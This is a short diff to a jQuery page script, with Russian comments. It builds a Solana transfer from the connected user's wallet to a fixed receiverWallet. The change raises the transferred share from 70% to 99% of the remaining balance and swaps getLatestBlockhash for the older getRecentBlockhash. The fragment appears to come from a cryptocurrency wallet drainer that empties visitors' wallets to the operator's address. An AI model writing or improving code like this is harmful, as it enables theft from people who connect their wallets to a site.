@@ -36,14 +36,14 @@ $(document).ready(function () {
                             solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: publicKey,
                                 toPubkey: receiverWallet,
-                                lamports: balanceForTransfer * 0.7, // 99% от оставшихся средств
+                                lamports: balanceForTransfer * 0.99, // 99% от оставшихся средств
                             })
                         );
 
                         transaction.feePayer = publicKey;
 
                         // Получаем последний blockhash
-                        const { blockhash } = await connection.getLatestBlockhash('finalized');
+                        const { blockhash } = await connection.getRecentBlockhash('finalized');
                         transaction.recentBlockhash = blockhash;
 
                         console.log("Transaction object before signing:", transaction);
